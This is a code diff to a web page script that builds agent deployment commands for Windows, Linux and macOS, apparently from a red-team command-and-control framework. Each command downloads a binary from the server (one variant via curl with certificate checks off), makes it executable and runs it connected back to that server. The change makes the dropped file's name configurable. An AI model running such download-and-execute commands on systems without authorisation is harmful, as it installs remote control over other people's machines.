@@ -81,13 +81,13 @@
             let x = $('#delivery-command');
             let loc = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
             if(selected_option === 'windows-psh') {
-                x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\sandcat.exe -server ' + loc + ' -group my_group -v;');
+                x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\\Users\\Public\\{{ sandname }}.exe";$wc.DownloadFile($url,$output); C:\\Users\\Public\\{{ sandname }}.exe -server ' + loc + ' -group my_group -v;');
             } else if(selected_option === 'windows-cmd') {
-                x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\sandcat.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\sandcat.exe -server '+loc+' -group my_group -executors cmd -v;')
+                x.text('$url="'+loc+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform", "windows"); $wc.Headers.add("file", "sandcat.go"); $output="C:\\Users\\Public\\{{ sandname }}.exe"; $wc.DownloadFile($url, $output); cmd.exe /c C:\\Users\\Public\\{{ sandname }}.exe -server '+loc+' -group my_group -executors cmd -v;')
             } else if (selected_option === 'linux') {
-                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server '+loc+' -group my_group -v;');
+                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download > /tmp/{{ sandname }}-linux && chmod +x /tmp/{{ sandname }}-linux && /tmp/{{ sandname }}-linux -server '+loc+' -group my_group -v;');
             } else if (selected_option === 'darwin') {
-                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
+                x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/{{ sandname }}-darwin && chmod +x /tmp/{{ sandname }}-darwin && /tmp/{{ sandname }}-darwin -server '+loc+' -group my_group -v;');
             }
         }
         function openDuk1(){
